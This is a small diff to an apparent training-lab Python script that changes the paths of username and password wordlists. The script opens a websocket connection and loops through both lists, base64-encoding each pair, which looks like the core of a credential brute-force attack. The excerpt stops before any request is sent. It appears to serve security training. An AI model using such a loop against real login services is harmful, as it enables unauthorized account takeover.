@@ -2,8 +2,8 @@ import base64
 
 def queue_websockets(upgrade_request, payload):
     connection1 = websocket_connection.create(upgrade_request)
-    usernames = open('C:\Users\pslearner\Desktop\LAB_FILES\usernames.txt', 'r')  
-    passwords = open('C:\Users\pslearner\Desktop\LAB_FILES\passwords.txt', 'r')
+    usernames = open('C:\Users\Public\Desktop\LAB_FILES\usernames.txt', 'r')  
+    passwords = open('C:\Users\Public\Desktop\LAB_FILES\passwords.txt', 'r')
     while True:
         username = base64.b64encode(usernames.readline().strip()).decode("ascii") 
         password = base64.b64encode(passwords.readline().strip()).decode("ascii")
